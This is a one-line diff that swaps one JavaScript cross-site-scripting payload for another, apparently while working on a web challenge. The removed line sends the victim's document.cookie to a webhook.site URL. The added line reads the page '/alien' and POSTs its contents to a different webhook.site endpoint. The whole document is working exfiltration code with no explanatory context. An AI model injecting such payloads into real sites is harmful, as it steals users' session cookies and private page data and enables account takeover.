@@ -1,1 +1,1 @@
-fetch('https://webhook.site/64385842-d826-467c-a877-7604335cd237?c='+document.cookie)
+fetch('/alien').then(res => res.text()).then(data => fetch('https://webhook.site/0ccf71c9-6d89-4191-b803-7c09701336da', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: data }) }))
